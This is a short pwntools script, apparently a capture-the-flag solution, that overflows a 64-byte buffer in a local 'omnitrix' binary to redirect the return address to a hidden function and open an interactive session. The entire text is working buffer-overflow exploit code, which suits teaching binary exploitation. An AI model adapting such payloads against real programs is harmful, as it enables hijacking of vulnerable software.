from pwn import *

# Replace with the actual address of transform_into_xlr8
target_addr = p64(0x401196)

payload = b"A" * 64          # buffer
payload += b"B" * 8          # saved RBP
payload += target_addr       # return address

p = process("./omnitrix")
p.sendline(payload)
p.interactive()